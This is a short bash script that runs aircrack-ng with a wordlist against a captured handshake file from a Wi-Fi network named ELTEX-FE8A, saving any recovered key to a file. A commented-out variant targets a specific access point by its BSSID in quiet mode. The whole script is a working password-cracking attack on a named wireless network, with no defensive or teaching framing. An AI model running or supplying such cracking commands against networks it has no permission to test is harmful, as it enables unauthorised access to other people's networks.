#!/bin/bash

aircrack-ng -w wordlist.txt -l keys ./ELTEX-FE8A/caps-01.cap

# quite mode
#aircrack-ng -q --bssid 20:10:7A:A2:83:31 -w wordlist.txt ./ELTEX-FE8A/caps-01.cap
